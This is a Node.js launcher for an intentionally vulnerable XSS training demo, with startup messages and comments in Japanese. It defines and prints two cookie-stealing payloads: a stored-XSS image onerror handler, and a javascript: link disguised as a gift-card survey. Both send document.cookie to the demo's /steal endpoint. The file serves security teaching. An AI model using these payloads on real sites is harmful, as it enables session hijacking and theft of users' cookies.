'use strict';

/*
 * ============================================================================
 *  ローカル / 常駐サーバー（Render・Railway など）用の起動エントリ
 * ============================================================================
 *  Vercel（サーバーレス）では使われません。Vercel は api/index.js を入口にします。
 * ============================================================================
 */

const os = require('os');
const app = require('./app');
const store = require('./store');

const PORT = process.env.PORT || 3000;

function lanIPs() {
  const out = [];
  const ifaces = os.networkInterfaces();
  Object.values(ifaces).forEach((list) => {
    (list || []).forEach((i) => {
      if (i.family === 'IPv4' && !i.internal) out.push(i.address);
    });
  });
  return out;
}

const ATTACK_1 =
  `いい天気ですね！<img src=x onerror="fetch('/steal?data='+encodeURIComponent(document.cookie))">`;
const ATTACK_2 =
  `<a href="javascript:fetch('/steal?data='+encodeURIComponent(document.cookie))">🎁 アンケートに答えてギフト券をもらう</a>`;

app.listen(PORT, () => {
  const local = `http://localhost:${PORT}`;
  console.log('\n================ XSS 体験デモ 起動しました ================\n');
  console.log('  ストレージ: ' + (store.mode === 'supabase' ? 'Supabase' : 'インメモリ（再起動でリセット）'));
  console.log('\n  参加ページ（参加者に共有）:');
  console.log('    ' + local);
  lanIPs().forEach((ip) => console.log('    http://' + ip + ':' + PORT + '   (同じ LAN の参加者用)'));
  console.log('\n  講師用ダッシュボード（盗まれた情報を表示）:');
  console.log('    ' + local + '/stolen');
  console.log('\n  ---- 攻撃1：見るだけで被害（格納型 XSS）----');
  console.log('    ' + ATTACK_1);
  console.log('\n  ---- 攻撃2：リンクを踏んで被害（javascript: スキーム）----');
  console.log('    ' + ATTACK_2);
  console.log('\n  ⚠️ これは意図的に脆弱な教材です。研修用のローカル/一時環境のみで使用してください。');
  console.log('\n==========================================================\n');
});
